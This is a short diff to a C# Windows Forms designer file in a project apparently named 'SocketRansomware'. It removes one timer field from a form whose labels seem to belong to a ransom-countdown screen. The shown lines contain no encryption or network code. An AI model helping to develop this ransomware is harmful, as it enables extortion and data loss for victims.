@@ -46,7 +46,6 @@ namespace SocketRansomware
             this.timer1 = new System.Windows.Forms.Timer(this.components);
             this.lbtimer1 = new System.Windows.Forms.Label();
             this.label4 = new System.Windows.Forms.Label();
-            this.timer2 = new System.Windows.Forms.Timer(this.components);
             this.lbtimer2 = new System.Windows.Forms.Label();
             this.label5 = new System.Windows.Forms.Label();
             this.lbDate1 = new System.Windows.Forms.Label();
@@ -361,7 +360,6 @@ namespace SocketRansomware
         private System.Windows.Forms.Timer timer1;
         private System.Windows.Forms.Label lbtimer1;
         private System.Windows.Forms.Label label4;
-        private System.Windows.Forms.Timer timer2;
         private System.Windows.Forms.Label lbtimer2;
         private System.Windows.Forms.Label label5;
         private System.Windows.Forms.Label lbDate1;
